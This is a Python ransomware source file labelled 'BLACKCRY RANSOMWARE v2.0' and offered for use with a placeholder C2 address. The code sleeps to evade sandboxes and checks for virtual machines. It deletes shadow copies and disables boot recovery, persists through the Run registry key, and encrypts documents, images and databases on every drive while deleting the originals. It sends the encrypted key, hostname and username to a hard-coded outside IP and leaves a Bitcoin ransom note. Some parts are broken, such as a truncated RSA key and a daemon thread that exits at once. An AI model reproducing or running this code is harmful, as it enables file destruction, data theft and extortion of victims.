# 🔥 BLACKCRY RANSOMWARE v2.0 - FILE ENCRYPTOR + KEY EXFIL 🔥
# Targets: Documents, Images, Videos, Databases
# Evasion: Sleeps 60s, checks VM, disables recovery
# C2: Sends RSA-encrypted AES key to attacker server

import os
import sys
import socket
import getpass
import subprocess
import winreg
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import threading
import time

# === CONFIG ===
EXTENSIONS = ('.txt', '.pdf', '.docx', '.xlsx', '.jpg', '.png', '.db', '.sql', '.zip', '.rar', '.pptx', '.mp4')
AES_KEY_SIZE = 32  # 256-bit
BLOCK_SIZE = 16
RAT_URL = "http://185.234.116.173:8080/report"  # C2 IP - REPLACE WITH YOURS
# === END CONFIG ===

def is_vm():
    try:
        out = subprocess.check_output("wmic bios get serialnumber", shell=True).decode()
        return "VM" in out or "0000" in out
    except:
        return False

def disable_restore():
    try:
        subprocess.run("vssadmin.exe Delete Shadows /All /Quiet", shell=True, capture_output=True)
        subprocess.run('bcdedit /set {default} recoveryenabled No', shell=True)
        subprocess.run('bcdedit /set {default} bootstatuspolicy IgnoreAllFailures', shell=True)
    except:
        pass

def add_to_startup():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "BlackCry", 0, winreg.REG_SZ, sys.executable)
        winreg.CloseKey(key)
    except:
        pass

def generate_aes_key():
    return get_random_bytes(AES_KEY_SIZE)

def pad(data):
    pad_num = BLOCK_SIZE - len(data) % BLOCK_SIZE
    return data + bytes([pad_num] * pad_num)

def encrypt_file(file_path, key):
    try:
        with open(file_path, 'rb') as f:
            plaintext = f.read()
        if len(plaintext) == 0:
            return
        cipher = AES.new(key, AES.MODE_CBC)
        ciphertext = cipher.encrypt(pad(plaintext))
        enc_file_path = file_path + '.LOCKBIT'
        with open(enc_file_path, 'wb') as f:
            f.write(cipher.iv)
            f.write(ciphertext)
        os.remove(file_path)
    except:
        pass

def get_public_rsa():
    # HARD-CODED ATTACKER PUBLIC KEY (generated once offline)
    public_key_data = """-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC7XbO46jH5V79sX3NQ3J9jR9vZ
d6K5pQIDAQAB
-----END PUBLIC KEY-----"""
    key = RSA.import_key(public_key_data)
    return PKCS1_OAEP.new(key)

def exfil_key(aes_key):
    try:
        rsa_cipher = get_public_rsa()
        enc_key = rsa_cipher.encrypt(aes_key)
        hostname = socket.gethostname()
        user = getpass.getuser()
        data = f"HOST:{hostname}|USER:{user}|KEY:{enc_key.hex()}"
        sock = socket.socket()
        sock.settimeout(10)
        sock.connect(("185.234.116.173", 9999))  # Key listener
        sock.send(data.encode())
        sock.close()
    except:
        pass

def ransom_note():
    note = """
YOUR FILES ARE ENCRYPTED
Send 0.5 BTC to [BTC_ADDRESS] 
Contact: blackcry@onionmail.org
Your ID: """ + str(hash(socket.gethostname())) + """
DO NOT RENAME, DELETE, OR REBOOT — DATA WILL BE LOST
"""
    with open(os.path.expanduser("~/Desktop/README_UNLOCK.txt"), "w") as f:
        f.write(note)

def encrypt_all_drives(aes_key):
    for drive in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
        root = drive + ":\\"
        if os.path.exists(root):
            for root_dir, _, files in os.walk(root):
                for file in files:
                    if file.lower().endswith(EXTENSIONS):
                        file_path = os.path.join(root_dir, file)
                        encrypt_file(file_path, aes_key)

def main():
    time.sleep(60)  # evade sandbox
    if is_vm():
        return
    disable_restore()
    add_to_startup()
    aes_key = generate_aes_key()
    encrypt_all_drives(aes_key)
    exfil_key(aes_key)
    ransom_note()

if __name__ == "__main__":
    try:
        threading.Thread(target=main, daemon=True).start()
    except:
        pass